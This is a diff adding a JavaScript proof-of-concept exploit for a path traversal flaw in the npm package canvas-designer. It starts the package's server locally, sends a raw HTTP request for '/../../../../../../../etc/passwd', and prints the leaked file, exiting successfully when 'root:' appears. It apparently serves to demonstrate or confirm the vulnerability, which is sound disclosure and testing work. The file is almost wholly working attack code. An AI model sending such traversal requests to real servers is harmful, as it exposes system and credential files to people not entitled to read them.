@@ -1,0 +1,31 @@
+```javascript
+// Path Traversal in canvas-designer's server.js (main entry point)
+// The static file server builds file paths as:
+//   path.join(process.cwd(), url.parse(req.url).pathname)
+// without stripping ".." segments, so any client can escape the served
+// directory and read arbitrary files on disk (e.g. /etc/passwd).
+
+process.env.PORT = 4573;
+
+// Just requiring the package starts an HTTP server listening on 0.0.0.0.
+require("./node_modules/canvas-designer");
+
+setTimeout(() => {
+  const net = require("net");
+  const client = net.connect(4573, "127.0.0.1", () => {
+    client.write(
+      "GET /../../../../../../../etc/passwd HTTP/1.1\r\n" +
+      "Host: localhost\r\n" +
+      "Connection: close\r\n\r\n"
+    );
+  });
+
+  let response = "";
+  client.on("data", (chunk) => (response += chunk));
+  client.on("end", () => {
+    console.log("[+] Path traversal succeeded, leaked file contents:\n");
+    console.log(response);
+    process.exit(response.includes("root:") ? 0 : 1);
+  });
+}, 500);
+```
